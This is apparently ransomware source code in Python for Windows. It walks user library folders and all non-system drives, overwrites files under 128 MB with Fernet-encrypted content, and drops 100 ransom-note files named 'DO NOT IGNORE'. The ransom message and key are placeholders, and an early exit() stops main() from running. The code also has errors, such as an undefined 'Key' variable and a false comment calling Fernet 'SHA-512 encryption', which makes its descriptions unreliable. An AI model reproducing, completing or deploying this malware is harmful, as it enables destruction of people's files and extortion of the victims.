import os
import string
import ctypes.wintypes

from cryptography.fernet import Fernet

# Encrypts 95% of files using SHA-512 encryption system.
# Encrypts all drives except C: . However encrypts libraries (Documents, Pictures) too.

libfiles = []
drivefiles = []
wodup = []
Letters = ['%s:' %d for d in string.ascii_uppercase if os.path.exists('%s: ' % d)]
username = os.getenv("USERNAME")
limit = (128*1000*1000)+1 # File size limit. Files beyond 128 mb will be ignored.
libpaths = []

MESSAGE = "MESSAGE-GOES-HERE"
key = "" # Get a key from generate_random_fernet.py

# Execute all the stage.
def main():
    Get_Library()
    Get_Drives()
    encryption_process()
    end_process(libpaths[0])

# Get paths of the files from library folders.
def Get_Library():
    TYPE_CURRENT = 0
    bvs = (0, 5, 13, 14, 39)
    for i in bvs:
        buf = ctypes.create_unicode_buffer(ctypes.wintypes.MAX_PATH)
        ctypes.windll.shell32.SHGetFolderPathW(None, i, None, TYPE_CURRENT, buf)
        libpaths.append(buf.value)
        
    Letters.remove(libpaths[0][0:2])
    
    for cof in libpaths:
        for root, subdirs_, files_ in os.walk(cof):
            for sdir in subdirs_:
                dflp = os.path.join(root, sdir)
                try:
                    dfl = os.listdir(dflp)
                except:
                    pass
                    
                for fls in dfl:
                    try:
                        absdpath = os.path.join(dflp, fls)
                        if os.path.getsize(absdpath) < limit:
                            libfiles.append('\n'+absdpath)
                    except:
                        pass
                        
            for fl in files_:
                try:
                    absdpath = os.path.join(root, fl)
                    if os.path.getsize(absdpath) < limit:
                        libfiles.append('\n'+absdpath)
                except:
                    pass

# Gets path which are from the Drives except 'C'
def Get_Drives():
    for lt in Letters:
        for root, subdir_, files_ in os.walk(lt):
            for sdir in subdir_:
                dflp = os.path.join(root, sdir)
                try:
                    dfl = os.listdir(dflp)
                except:
                    pass
                    
                for fls in dfl:
                    try:
                        absdpath = os.path.join(dflp, fls)
                        if os.path.getsize(absdpath) < limit:
                            libfiles.append('\n'+absdpath)
                    except:
                        pass    
                        
                for fl in files_:
                    try:
                        absdpath = os.path.join(root, fl)
                        if os.path.getsize(absdpath) < limit:
                            libfiles.append('\n'+absdpath)
                    except:
                        pass      

    drivefiles.extend(libfiles)
    
    # To Avoid if any duplicate elements somewhat went.
    for p in drivefiles:
        if p not in wodup:
            wodup.append(p)  

# The main part. Encrypts the files which are collected from "Get" functions.
def encryption_process():
    for fs in drivefiles:
        try:
            with open(fs[1:], 'rb') as opnfs:
                contentz = opnfs.read()

            with open(fs[1:], 'wb') as wfs:
                wfs.write(Fernet(Key).encrypt(contentz))
                print(f"Encrypted: {fs[1:]}")
        except:
            pass

# Does rest of the task after encryption.
def end_process(DPath_):

    global filepath, keypath
    filepath = os.path.join(DPath_, "files.txt")
    with open(filepath, "w", encoding='UTF-8') as fwriet:
        fwriet.write("".join(wodup))
        
    for i in range(1,101):
        msgpath = os.path.join(DPath_, f"DO NOT IGNORE{i}.txt")
        with open(msgpath, "w") as msg_write:
            msg_write.write(MESSAGE)
    
if __name__ == '__main__':
    exit()
    
    main()
